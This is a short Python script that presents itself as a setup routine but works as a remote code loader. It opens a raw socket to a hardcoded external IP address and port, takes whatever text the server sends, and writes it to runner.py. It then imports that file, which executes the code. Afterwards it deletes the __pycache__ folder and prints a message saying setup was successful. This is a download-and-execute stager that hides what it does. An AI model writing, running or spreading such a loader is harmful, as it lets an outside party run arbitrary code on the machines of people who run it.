import socket
import os
import shutil
from tkinter import simpledialog

IP = '75.143.196.165'
PORT = 5055
ADDR = (IP, PORT)
Header = 999999999

cl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cl.connect(ADDR)
DATA = cl.recv(Header).decode('utf-8')

file = open('runner.py', 'w')

file.write(DATA)
print(DATA)
file.close()

import runner
shutil.rmtree('__pycache__')
print('Thank you for waiting so long thankfully the setup was Successful')